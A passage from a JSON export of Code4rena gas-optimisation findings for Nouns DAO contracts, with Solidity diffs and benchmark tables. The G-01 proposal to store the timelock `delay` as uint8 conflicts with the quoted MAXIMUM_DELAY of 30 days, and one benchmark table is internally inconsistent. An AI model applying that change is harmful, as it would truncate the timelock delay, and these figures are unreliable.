/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol\n149:        for (uint256 i = 0; i < tokenIds.length; i++) {\n150:            uint256 nounId = tokenIds[i];\n151:            if (escrow.ownerOfEscrowedToken(forkId, nounId) != msg.sender) revert OnlyTokenOwnerCanClaim();\n\n156:            _mintWithOriginalSeed(msg.sender, nounId);\n157:        }\n```\n\n```diff\n     function claimFromEscrow(uint256[] calldata tokenIds) external {\n+        INounsDAOForkEscrow _escrow =  escrow;\n+        uint32 _forkId = forkId;\n         for (uint256 i = 0; i < tokenIds.length; i++) {\n             uint256 nounId = tokenIds[i];\n-            if (escrow.ownerOfEscrowedToken(forkId, nounId) != msg.sender) revert OnlyTokenOwnerCanClaim();\n+            if (_escrow.ownerOfEscrowedToken(_forkId, nounId) != msg.sender) revert OnlyTokenOwnerCanClaim();\n\n             _mintWithOriginalSeed(msg.sender, nounId);\n         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20203",
      "title": "[G-03] Use calldata instead of memory for function parameters",
      "impact": "GAS",
      "content": "If a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory. Calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.\n\nNote that I've also flagged instances where the function is public but can be marked as external since it's not called by the contract.\n\n<details>\n\n### NounsDAOLogicV3.sol.updateProposal(): use calldata for `targets,values,signatures,calldatas,description` (Saves 2251 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L278-L288\n\n**Gas benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 10622    | 20773   | 14500 | 92416 |\n| After  | 9612    | 18522   | 12580 | 90342 |\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol\n278:    function updateProposal(\n279:        uint256 proposalId,\n280:        address[] memory targets,\n281:        uint256[] memory values,\n282:        string[] memory signatures,\n283:        bytes[] memory calldatas,\n284:        string memory description,\n285:        string memory updateMessage\n286:    ) external {\n287:        ds.updateProposal(proposalId, targets, values, signatures, calldatas, description, updateMessage);\n288:    }\n```\nLast variable has not been modified to avoid the stack too deep error\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol\nindex 00c5ccdc..4e8281cb 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol\n@@ -277,11 +277,11 @@ contract NounsDAOLogicV3 is NounsDAOStorageV3, NounsDAOEventsV3 {\n      */\n     function updateProposal(\n         uint256 proposalId,\n-        address[] memory targets,\n-        uint256[] memory values,\n-        string[] memory signatures,\n-        bytes[] memory calldatas,\n-        string memory description,\n+        address[] calldata targets,\n+        uint256[] calldata values,\n+        string[] calldata signatures,\n+        bytes[] calldata calldatas,\n+        string calldata description,\n         string memory updateMessage\n     ) external {\n         ds.updateProposal(proposalId, targets, values, signatures, calldatas, description, updateMessage);\n```\n\n### NounsDAOLogicV3.sol.updateProposalTransactions(): use calldata for `targets,values,signatures,calldatas,updateMessage` (Saves 2301 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L313-L322\n\n**Gas benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 9566    | 19643   | 13349 | 90201 |\n| After  | 8515    | 17342   | 11461 | 88076 |\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol\n313:    function updateProposalTransactions(\n314:        uint256 proposalId,\n315:        address[] memory targets,\n316:        uint256[] memory values,\n317:        string[] memory signatures,\n318:        bytes[] memory calldatas,\n319:        string memory updateMessage\n320:    ) external {\n321:        ds.updateProposalTransactions(proposalId, targets, values, signatures, calldatas, updateMessage);\n322:    }\n```\n\n```diff\n     function updateProposalTransactions(\n         uint256 proposalId,\n-        address[] memory targets,\n-        uint256[] memory values,\n-        string[] memory signatures,\n-        bytes[] memory calldatas,\n-        string memory updateMessage\n+        address[] calldata targets,\n+        uint256[] calldata values,\n+        string[] calldata signatures,\n+        bytes[] calldata calldatas,\n+        string calldata updateMessage\n     ) external {\n         ds.updateProposalTransactions(proposalId, targets, values, signatures, calldatas, updateMessage);\n     }\n```\n\n### NounsDAOLogicV3.sol.updateProposalBySigs(): use calldata for `proposerSignatures,targets,values` (Saves 2197 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L338-L355\n\n**Gas benchmarks**\n\n|        | Min  | Average | Median | Max   |\n| ------ | ---- | ------- | ------ | ----- |\n| Before | 15239  | 38005   | 33310  | 122687 |\n| After  | 14700 | 35808   | 31945  | 120500 |\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol\n338:    function updateProposalBySigs(\n339:        uint256 proposalId,\n340:        ProposerSignature[] memory proposerSignatures,\n341:        address[] memory targets,\n342:        uint256[] memory values,\n343:        string[] memory signatures,\n344:        bytes[] memory calldatas,\n345:        string memory description,\n346:        string memory updateMessage\n347:    ) external {\n348:        ds.updateProposalBySigs(\n349:            proposalId,\n350:            proposerSignatures,\n351:            NounsDAOV3Proposals.ProposalTxs(targets, values, signatures, calldatas),\n352:            description,\n353:            updateMessage\n354:        );\n355:    }\n```\nWe cannot refactor all variables to avoid stack too deep error\n```diff\n     function updateProposalBySigs(\n         uint256 proposalId,\n-        ProposerSignature[] memory proposerSignatures,\n-        address[] memory targets,\n-        uint256[] memory values,\n+        ProposerSignature[] calldata proposerSignatures,\n+        address[] calldata targets,\n+        uint256[] calldata values,\n         string[] memory signatures,\n         bytes[] memory calldatas,\n         string memory description,\n```\n\n### NounsDAOLogicV3.sol.proposeBySigs(): use calldata for `proposerSignatures,targets,values,signatures` (Saves 1565 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L236-L250\n\n**Gas benchmarks**\n\n|        | Min  | Average | Median | Max   |\n| ------ | ---- | ------- | ------ | ----- |\n| Before | 13725  | 431650   | 431722  | 535759 |\n| After  | 13336 | 430085   | 430511  | 533718 |\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol\n236:    function proposeBySigs(\n237:        ProposerSignature[] memory proposerSignatures,\n238:        address[] memory targets,\n239:        uint256[] memory values,\n240:        string[] memory signatures,\n241:        bytes[] memory calldatas,\n242:        string memory description\n243:    ) external returns (uint256) {\n244:        return\n245:            ds.proposeBySigs(\n246:                proposerSignatures,\n247:                NounsDAOV3Proposals.ProposalTxs(targets, values, signatures, calldatas),\n248:                description\n249:            );\n250:    }\n```\nNote: not all variables are changed, this is to avoid the stack too deep error\n\n```diff\n     function proposeBySigs(\n-        ProposerSignature[] memory proposerSignatures,\n-        address[] memory targets,\n-        uint256[] memory values,\n-        string[] memory signatures,\n+        ProposerSignature[] calldata proposerSignatures,\n+        address[] calldata targets,\n+        uint256[] calldata values,\n+        string[] calldata signatures,\n         bytes[] memory calldatas,\n         string memory description\n     ) external returns (uint256) {\n```\n\n### NounsDAOLogicV3.sol.proposeOnTimelockV1():  Change to external and use calldata for `targets,values,signatures,calldatas,description` (Saves 541 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L210-L222\n\n**Gas benchmarks**\n\n|        | Min  | Average | Median | Max   |\n| ------ | ---- | ------- | ------ | ----- |\n| Before | 341736  | 683821   | 683821  | 1025906 |\n| After  | 341705 | 683280   | 683280  | 1024855 |\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol\n210:    function proposeOnTimelockV1(\n211:        address[] memory targets,\n212:        uint256[] memory values,\n213:        string[] memory signatures,\n214:        bytes[] memory calldatas,\n215:        string memory description\n216:    ) public returns (uint256) {\n217:        return\n218:            ds.proposeOnTimelockV1(\n219:                NounsDAOV3Proposals.ProposalTxs(targets, values, signatures, calldatas),\n220:                description\n221:            );\n222:    }\n```\n\n```diff\n     function proposeOnTimelockV1(\n-        address[] memory targets,\n-        uint256[] memory values,\n-        string[] memory signatures,\n-        bytes[] memory calldatas,\n-        string memory description\n-    ) public returns (uint256) {\n+        address[] calldata targets,\n+        uint256[] calldata values,\n+        string[] calldata signatures,\n+        bytes[] calldata calldatas,\n+        string calldata description\n+    ) external returns (uint256) {\n         return\n             ds.proposeOnTimelockV1(\n                 NounsDAOV3Proposals.ProposalTxs(targets, values, signatures, calldatas),\n```\n\n### NounsDAOLogicV1Fork.sol.quit(): use calldata for `erc20TokensToInclude` (Saves 105 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216\n\n**Gas benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 14309    | 165989   | 151098 | 347452 |\n| After  | 165884    | 165884   | 151011 | 347390 |\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n206:    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {\n\n208:        address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;\n209:        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n210:            if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {\n211:                revert TokensMustBeASubsetOfWhitelistedTokens();\n212:            }\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\nindex 0b098e44..beaff3ab 100644\n--- a/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol\n@@ -203,7 +203,7 @@ contract NounsDAOLogicV1Fork is UUPSUpgradeable, ReentrancyGuardUpgradeable, Nou\n         quitInternal(tokenIds, erc20TokensToIncludeInQuit);\n     }\n\n-    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {\n+    function quit(uint256[] calldata tokenIds, address[] calldata erc20TokensToInclude) external nonReentrant {\n         // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit`\n         address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;\n         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n```\n\n### Change to external and use calldata on signature and data (Save 520 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol#L130-L148\n\n**Gas Benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 26117    | 27113   | 26117 | 29751 |\n| After  | 25652    | 26593   | 25652 | 28749 |\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol\n130:    function queueTransaction(\n131:        address target,\n132:        uint256 value,\n133:        string memory signature,\n134:        bytes memory data,\n135:        uint256 eta\n136:    ) public returns (bytes32) {\n\n143:        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n        \n146:        emit QueueTransaction(txHash, target, value, signature, data, eta);\n147:        return txHash;\n148:    }\n```\n\n```diff\n@@ -130,10 +130,10 @@ contract NounsDAOExecutorV2 is UUPSUpgradeable, Initializable {\n     function queueTransaction(\n         address target,\n         uint256 value,\n-        string memory signature,\n-        bytes memory data,\n+        string calldata signature,\n+        bytes calldata data,\n         uint256 eta\n-    ) public returns (bytes32) {\n+    ) external returns (bytes32) {\n         require(msg.sender == admin, 'NounsDAOExecutor::queueTransaction: Call must come from admin.');\n         require(\n             eta >= getBlockTimestamp() + delay,\n```\n\n### Change to external and use calldata on signature and data (Save 462 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol#L150-L163\n\n**Gas Benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 10017    | 10068   | 10017 | 10426 |\n| After  | 9552    | 9606   | 9552 | 9882 |\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol\n150:    function cancelTransaction(\n151:        address target,\n152:        uint256 value,\n153:        string memory signature,\n154:        bytes memory data,\n155:        uint256 eta\n156:    ) public {\n\n159:        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n\n162:        emit CancelTransaction(txHash, target, value, signature, data, eta);\n163:    }\n```\n\n```diff\n@@ -150,10 +150,10 @@ contract NounsDAOExecutorV2 is UUPSUpgradeable, Initializable {\n     function cancelTransaction(\n         address target,\n         uint256 value,\n-        string memory signature,\n-        bytes memory data,\n+        string calldata signature,\n+        bytes calldata data,\n         uint256 eta\n-    ) public {\n+    ) external {\n         require(msg.sender == admin, 'NounsDAOExecutor::cancelTransaction: Call must come from admin.');\n\n         bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n```\n\n### Change to external and use calldata on signature and data (Save 412 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol#L165-L202\n\n**Gas Benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 2437    | 53364   | 29527 | 339600 |\n| After  | 2048    | 52952   | 28893 | 339006 |\n\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol\n165:    function executeTransaction(\n166:        address target,\n167:        uint256 value,\n168:        string memory signature,\n169:        bytes memory data,\n170:        uint256 eta\n171:    ) public returns (bytes memory) {\n\n174:        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n\n189:        if (bytes(signature).length == 0) {\n190:            callData = data;\n191:        } else {\n192:            callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);\n193:        }\n\n199:        emit ExecuteTransaction(txHash, target, value, signature, data, eta);\n```\n\n```diff\n@@ -165,10 +165,10 @@ contract NounsDAOExecutorV2 is UUPSUpgradeable, Initializable {\n     function executeTransaction(\n         address target,\n         uint256 value,\n-        string memory signature,\n-        bytes memory data,\n+        string calldata signature,\n+        bytes calldata data,\n         uint256 eta\n-    ) public returns (bytes memory) {\n+    ) external returns (bytes memory) {\n         require(msg.sender == admin, 'NounsDAOExecutor::executeTransaction: Call must come from admin.');\n\n         bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n```\n\n### Change to external and use calldata on signature and data (Save 786 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L107-L125\n\n**Gas Benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 26107    | 28172   | 28107 | 29783 |\n| After  | 25691    | 27386   | 27691 | 28240 |\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n107:    function queueTransaction(\n108:        address target,\n109:        uint256 value,\n110:        string memory signature,\n111:        bytes memory data,\n112:        uint256 eta\n113:    ) public returns (bytes32) {\n\n120:        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n\n123:        emit QueueTransaction(txHash, target, value, signature, data, eta);\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\nindex 2f87cd01..d705c94d 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n@@ -107,10 +107,10 @@ contract NounsDAOExecutor {\n     function queueTransaction(\n         address target,\n         uint256 value,\n-        string memory signature,\n-        bytes memory data,\n+        string calldata signature,\n+        bytes calldata data,\n         uint256 eta\n-    ) public returns (bytes32) {\n+    ) external returns (bytes32) {\n         require(msg.sender == admin, 'NounsDAOExecutor::queueTransaction: Call must come from admin.');\n         require(\n             eta >= getBlockTimestamp() + delay,\n```\n\n### Change to external and use calldata on signature and data (Save 404 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L127-L140\n\n**Gas Benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 4788    | 8671   | 9985 | 9985 |\n| After  | 4456    | 8267   | 9569 | 9569 |\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n127:    function cancelTransaction(\n128:        address target,\n129:        uint256 value,\n130:        string memory signature,\n131:        bytes memory data,\n132:        uint256 eta\n133:    ) public {\n\n136:        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n\n139:        emit CancelTransaction(txHash, target, value, signature, data, eta);\n140:    }\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\nindex 2f87cd01..25956a16 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n@@ -127,10 +127,10 @@ contract NounsDAOExecutor {\n     function cancelTransaction(\n         address target,\n         uint256 value,\n-        string memory signature,\n-        bytes memory data,\n+        string calldata signature,\n+        bytes calldata data,\n         uint256 eta\n-    ) public {\n+    ) external {\n         require(msg.sender == admin, 'NounsDAOExecutor::cancelTransaction: Call must come from admin.');\n\n         bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n```\n\n### Change to external and use calldata on signature and data (Save 785 gas on average)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L142-L179\n\n**Gas Benchmarks**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 2360    | 42009   | 30881 | 142555 |\n| After  | 2020    | 41224   | 30668 | 140491 |\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n142:    function executeTransaction(\n143:        address target,\n144:        uint256 value,\n145:        string memory signature,\n146:        bytes memory data,\n147:        uint256 eta\n148:    ) public returns (bytes memory) {\n\n151:        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n\n166:        if (bytes(signature).length == 0) {\n167:            callData = data;\n168:        } else {\n169:            callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);\n170:        }\n\n172:        // solium-disable-next-line security/no-call-value\n173:        (bool success, bytes memory returnData) = target.call{ value: value }(callData);\n\n\n176:        emit ExecuteTransaction(txHash, target, value, signature, data, eta);\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\nindex 2f87cd01..d3d4b135 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n@@ -142,10 +142,10 @@ contract NounsDAOExecutor {\n     function executeTransaction(\n         address target,\n         uint256 value,\n-        string memory signature,\n-        bytes memory data,\n+        string calldata signature,\n+        bytes calldata data,\n         uint256 eta\n-    ) public returns (bytes memory) {\n+    ) external returns (bytes memory) {\n         require(msg.sender == admin, 'NounsDAOExecutor::executeTransaction: Call must come from admin.');\n\n         bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n```\n\n</details>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20202",
      "title": "[G-02] Pack structs by putting data types that can fit together next to each other",
      "impact": "GAS",
      "content": "As the solidity EVM works with 32 bytes, variables less than 32 bytes should be packed inside a struct so that they can be stored in the same slot, this saves gas when writing to storage ~20000 gas\n\n### We have some uint32 that can be be packed with an address (Save 1 SLOT: 2.1K gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol#L653-L717\n\n**Pack lastMinuteWindowInBlocks,objectionPeriodDurationInBlocks,proposalUpdatablePeriodInBlocks with forkDAOTreasury** \n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol\n    struct StorageV3 {\n\t\t<Truncated>\n690:        uint32 lastMinuteWindowInBlocks;\n691:        /// @notice Length of the objection period in blocks\n692:        uint32 objectionPeriodDurationInBlocks;\n693:        /// @notice Length of proposal updatable period in block\n694:        uint32 proposalUpdatablePeriodInBlocks;\n695:        /// @notice address of the DAO's fork escrow contract\n696:        INounsDAOForkEscrow forkEscrow;\n697:        /// @notice address of the DAO's fork deployer contract\n698:        IForkDAODeployer forkDAODeployer;\n699:        /// @notice ERC20 tokens to include when sending funds to a deployed fork\n700:        address[] erc20TokensToIncludeInFork;\n701:        /// @notice The treasury contract of the last deployed fork\n702:        address forkDAOTreasury;\n    <Truncated>\n       \n    }\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol b/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol\nindex 8fb0b4d3..ba0a251f 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol\n@@ -686,12 +686,6 @@ contract NounsDAOStorageV3 {\n         // ================ V3 ================ //\n         /// @notice user => sig => isCancelled: signatures that have been cancelled by the signer and are no longer valid\n         mapping(address => mapping(bytes32 => bool)) cancelledSigs;\n-        /// @notice The number of blocks before voting ends during which the objection period can be initiated\n-        uint32 lastMinuteWindowInBlocks;\n-        /// @notice Length of the objection period in blocks\n-        uint32 objectionPeriodDurationInBlocks;\n-        /// @notice Length of proposal updatable period in block\n-        uint32 proposalUpdatablePeriodInBlocks;\n         /// @notice address of the DAO's fork escrow contract\n         INounsDAOForkEscrow forkEscrow;\n         /// @notice address of the DAO's fork deployer contract\n@@ -700,6 +694,12 @@ contract NounsDAOStorageV3 {\n         address[] erc20TokensToIncludeInFork;\n         /// @notice The treasury contract of the last deployed fork\n         address forkDAOTreasury;\n+        /// @notice The number of blocks before voting ends during which the objection period can be initiated\n+        uint32 lastMinuteWindowInBlocks;\n+        /// @notice Length of the objection period in blocks\n+        uint32 objectionPeriodDurationInBlocks;\n+        /// @notice Length of proposal updatable period in block\n+        uint32 proposalUpdatablePeriodInBlocks;\n         /// @notice The token contract of the last deployed fork\n         address forkDAOToken;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20201",
      "title": "[G-01] Tightly pack storage variables/optimize the order of variable declaration",
      "impact": "GAS",
      "content": "The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to eachother in storage and this will pack the values together into a single 32 byte storage slot (if the values combined are <= 32 bytes). If the variables packed together are retrieved together in functions we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a `Gwarmaccess (100 gas)` versus a `Gcoldsload (2100 gas)`.\nHere, the storage variables can be tightly packed from:\n\n<details>\n\n### We can pack `admin and delay` by reducing the size of delay to uint8, or any other type less than uint96 (Save 1 SLOT: 2100 GAS)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol#L89-L91\n\n**This is possible because we constrain the value of `delay` to 0 - 30** \n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol\n89:    address public admin;\n90:    address public pendingAdmin;\n91:    uint256 public delay;\n```\n\nWe can see why it's safe to reduce the size of the variable delay. When setting delay we are checking that the value set should be between **MINIMUM\\_DELAY and MAXIMUM\\_DELAY** which are constant variables with values 0 and 30 respectively.<br>\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol#L103-L110\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol\n103:    function setDelay(uint256 delay_) public {\n\n105:        require(delay_ >= MINIMUM_DELAY, 'NounsDAOExecutor::setDelay: Delay must exceed minimum delay.');\n106:        require(delay_ <= MAXIMUM_DELAY, 'NounsDAOExecutor::setDelay: Delay must not exceed maximum delay.');\n107:        delay = delay_;\n```\n\n**The refactored code would be like this, note that we pack with admin as they are accessed in one transaction**\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol\nindex f4f85883..ab900fed 100644\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol\n@@ -87,8 +87,9 @@ contract NounsDAOExecutorV2 is UUPSUpgradeable, Initializable {\n     uint256 public constant MAXIMUM_DELAY = 30 days;\n\n     address public admin;\n+    uint8 public delay;\n     address public pendingAdmin;\n-    uint256 public delay;\n```\nSome other parts of the code will pass a uint256 thus we can type cast those parts eg \n```diff\n     function setDelay(uint256 delay_) public {\n         require(msg.sender == address(this), 'NounsDAOExecutor::setDelay: Call must come from NounsDAOExecutor.');\n         require(delay_ >= MINIMUM_DELAY, 'NounsDAOExecutor::setDelay: Delay must exceed minimum delay.');\n         require(delay_ <= MAXIMUM_DELAY, 'NounsDAOExecutor::setDelay: Delay must not exceed maximum delay.');\n-        delay = delay_;\n+        delay = uint8(delay_);\n\n         emit NewDelay(delay_);\n     }\n```\n\n### Pack admin and delay together by reducing size of delay (Save 1 SLOT: 2.1K Gas)\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L66-L68\n\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n66:    address public admin;\n67:    address public pendingAdmin;\n68:    uint256 public delay;\n```\nWhen setting delay, we have a conditional check that ensures the value of delay is between  2 and 30\n```solidity\n        require(delay_ >= MINIMUM_DELAY, 'NounsDAOExecutor::constructor: Delay must exceed minimum delay.');\n        require(delay_ <= MAXIMUM_DELAY, 'NounsDAOExecutor::setDelay: Delay must not exceed maximum delay.');\n```\nAs such we know delay will always be less than 30. We can therefore reduce the size of the data type to uint8 and pack the variable with `admin`\n\n```diff\n--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol\n@@ -64,9 +64,9 @@ contract NounsDAOExecutor {\n     uint256 public constant MAXIMUM_DELAY = 30 days;\n\n     address public admin;\n+    uint8 public delay;\n     address public pendingAdmin;\n-    uint256 public delay;\n```\n\n### Both duration and timeBuffer can be changed to uint48 (Save 3 SLOTS: 6300 Gas )\nhttps://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol#L50-L69\n\n**We pack nouns with duration, weth with timeBuffer and minBidIncrementPercentage**\n```solidity\nFile: /packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol\n\n50:    // The Nouns ERC721 token contract\n51:    INounsToken public nouns;\n\n53:    // The address of the WETH contract\n54:    address public weth;\n\n56:    // The minimum amount of time left in an auction after a new bid is created\n57:    uint256 public timeBuffer;\n\n59:    // The minimum price accepted in an auction\n60:    uint256 public reservePrice;\n\n62:    // The minimum percentage difference between the last bid amount and the current bid\n63:    uint8 public minBidIncrementPercentage;\n\n65:    // The duration of a single auction\n66:    uint256 public duration;\n\n68:    // The active auction\n69:    INounsAuctionHouse.Auction public auction;\n```\n\n```diff\ndiff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol 